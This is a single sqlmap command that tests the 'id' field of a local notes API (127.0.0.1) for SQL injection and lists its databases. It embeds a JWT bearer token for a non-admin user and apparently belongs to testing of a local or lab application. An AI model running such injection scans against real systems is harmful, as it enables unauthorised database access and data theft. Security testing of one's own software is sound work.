sqlmap -u "http://127.0.0.1:5000/api/notes/view" \
  --method=POST \
  --headers="Content-Type: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6InVzZXJfYSIsImlzX2FkbWluIjpmYWxzZSwiZXhwIjoxNzQ4NjUyODA5fQ.TcxzuDnZRHx4IIFiamkzuXyJUBEo-r_Eh--85YPQsPE" \
  --data='{"id": "1"}' \
  -p id \
  --dbs --batch
